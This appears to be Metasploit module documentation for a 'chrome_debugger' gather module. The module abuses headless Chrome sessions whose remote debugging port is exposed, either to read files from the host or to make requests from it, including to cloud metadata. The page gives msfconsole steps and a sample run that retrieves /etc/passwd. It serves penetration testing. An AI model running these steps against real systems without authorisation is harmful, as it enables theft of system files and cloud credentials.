## Vulnerable Application

This module takes advantage of misconfigured headless chrome sessions and either retrieves a specified file off the remote file system, or makes a web request from the remote machine.

This can be useful for retrieving cloud metadata in certain scenarios.  Primarily this module targets developers.

A vulnerable Headless Chrome session can be started with the following command:

```
$ google-chrome --remote-debugging-port=9222 --headless --remote-debugging-address=0.0.0.0
```

This will start a webserver running on port 9222 for all network interfaces.

## Verification Steps

1. Start `msfconsole`
2. Execute `auxiliary/gather/chrome_debugger`
3. Execute `set RHOST $REMOTE_ADDRESS`
4. Execute `set RPORT 9222`
5. Execute either `set FILEPATH $FILE_PATH_ON_REMOTE` or `set URL $URL_FROM_REMOTE`
6. Execute `run`

## Options

**FILEPATH**

The file path on the remote you wish to retrieve.

**URL**

A URL you wish to fetch the contents of from the remote machine.

**Note:** One or the other must be set!

## Scenarios

```
[*] Attempting Connection to ws://192.168.20.168:9222/devtools/page/CF551031373306B35F961C6C0968DAEC
[*] Opened connection
[*] Attempting to load url file:///etc/passwd
[*] Received Data
[*] Sending request for data
[*] Received Data
[+] Retrieved resource
[*] Auxiliary module execution completed
```
